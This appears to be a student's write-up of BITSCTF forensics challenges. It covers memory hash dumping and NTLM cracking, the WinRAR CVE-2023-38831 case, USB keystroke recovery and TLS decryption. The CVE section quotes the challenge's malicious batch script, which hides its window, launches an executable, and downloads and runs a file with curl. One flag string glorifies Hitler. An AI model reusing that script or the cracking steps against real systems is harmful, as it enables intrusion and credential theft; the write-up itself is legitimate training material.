#Access Granted

**Flag:** `BITSCTF{adolfhitlerrulesallthepeople}`

Approach

- step 1<br>
Dumping the hash dumps from memory images using Volatility 3.

- step 2<br>
Cracking the NTLM hashes using CrackStation.


![](https://github.com/adityachawla005/cryptonite_taskphase_Aditya/raw/main/TP2/Forensics/assets/vol.png)


What you learned through solving this challenge:
<br>
- How to crack password hashes and using Volatility 3 for dumping.


References

- ![Cracking Hashes](https://crackstation.net/)

<br>
<br>

#0.69 Day

**Flag:** `BITSCTF{CVE-2023-38831}`

Approach

- step 1<br>
Exploring the WinRAR vulnerability which executes steps.pdf.bat malicious file when it is extracted. 
If we search under MogamBro's user directory in the disk dump, we find MogamBro/AppData/Roaming/WinRAR.
And also under Downloads a zip folder Follow these instructions.

```
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
@echo off
lottery.exe & start chrome -incognito https://pastebin.com/mPvzn0AD & notepad.exe secret.png.enc & curl google.com -o steps.pdf & steps.pdf
exit
```

What you learned through solving this challenge:
<br>
- About CVE and how outdates software of WinRAR can be exploited.


References

- ![Exploit](https://github.com/z3r0sw0rd/CVE-2023-38831-PoC)

<br>
<br>

#MogamBro's Guilty Pleasure	

**Flag:** `BITSCTF{sp4m_2_ph1sh_U}`

Approach

- step 1<br>
When we open the YOU WON A LOTTERY eml file under Outlook it matches the downloads file lottery.exe.
It is simple a decoy.

- step 2<br>
However the other link 50% discount on plushies is a Spam Mimmic link and has hidden flag behind it.	


![](https://github.com/adityachawla005/cryptonite_taskphase_Aditya/raw/main/TP2/Forensics/assets/vol.png)



What you learned through solving this challenge:
<br>
- About a Spam Mimmic Link.

References

- ![Source on Spam text](https://www.giac.org/paper/gsec/1461/steganography-real-risk/102743)

<br>
<br>


#I'm wired in	

**Flag:** `BITSCTF{I_7h1nk_th3y_4Re_k3yl0991ng_ME!}`

Approach

- step 1<br>
 We have to find the keystroke history of the user to obtain the flag. Going through the image, I noticed a keylog.pcapng file and a key file in the Desktop directory of MogamBro.

- step 2<br>
After extracting and analyzing the pcapng file, USB traffic can be found. Researching online about USB packets,I found a USBKeyTranslator repo to retrieve HID data from packets.

```bash
$ python USBkeysTranslator.py keylog.pcapng 

[+] Using filter "usbhid.data" Retrived HID Data is :

I haveebeen haakee  !!!
HELLMEE
BITSCTF{I_-7h1nk_th3y_4Re_k3yl0991ng_ME!}

 MogamBro
```

What you learned through solving this challenge:
<br>
- How to view the contents of a keylog file and analysing the USB traffic.

References

- ![USB keys translator](https://github.com/fa1c0n1/USBkeysTranslator)

<br>
<br>

#ByPassing Transport Layer	

**Flag:** `BITSCTF{5te4l1ng_pr1v47e_key5_ez:)}`

Approach

- step 1<br>
 I found TLS keys on MogamBro's desktop directory.Analyzing the powershell history in the AD1 image, you can see that a sequence of commands sets up environment variables for logging SSL/TLS keys, then it captures network traffic and saves the data into the pcap file given by the authors. 
We can use keys file t decrypt the TLS packets.

- step 2<br>
Using Wireshark, I imported the key file to the pcap file to reveal the unencrypted packets. It is possible by Edit > Preference > Protocols > TLS > Browse key file and Wireshark should display the unencrypted packets.Looking through the pcap, we see HTTP2 packets that seem to be images, GIFs and other files.We can export them.(lot of 18+ stuff).We can use and strings to get the flag name.

```bash
strings ./* | grep -i "BITSCTF"
BITSCTF{5te4l1ng_pr1v47e_key5_ez:)}
```

![](https://github.com/adityachawla005/cryptonite_taskphase_Aditya/raw/main/TP2/Forensics/assets/trans.png)


<br>
<br>





